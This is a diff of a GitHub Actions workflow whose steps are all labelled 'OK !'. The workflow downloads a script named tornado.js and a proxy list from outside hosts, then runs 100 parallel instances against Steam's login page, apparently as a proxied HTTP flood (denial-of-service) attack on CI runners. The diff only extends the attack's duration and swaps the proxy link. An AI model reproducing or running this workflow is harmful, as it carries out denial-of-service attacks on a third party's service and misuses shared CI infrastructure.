@@ -16,12 +16,12 @@ jobs:
       - name: OK !
         run: |
           wget https://github.com/kaneious/tornado/raw/refs/heads/main/tornado.js
-          wget https://curl.by/y6XN9/proxies.txt
+          wget https://curl.by/7vEcg/proxies.txt
           npm i hpack
           chmod +x tornado.js
           PIDS=()
           for i in {1..100}; do
-            timeout 84 node tornado.js GET https://store.steampowered.com/login/ 85 24 64 proxies.txt --full --query 3
+            timeout 120 node tornado.js GET https://store.steampowered.com/login/ 85 24 64 proxies.txt --full --query 3
             PIDS+=($!)
           done
           
@@ -30,7 +30,7 @@ jobs:
           done
 
       - name: OK !
-        run: sleep 84
+        run: sleep 120
         
       - name: OK !
         run: sudo reboot
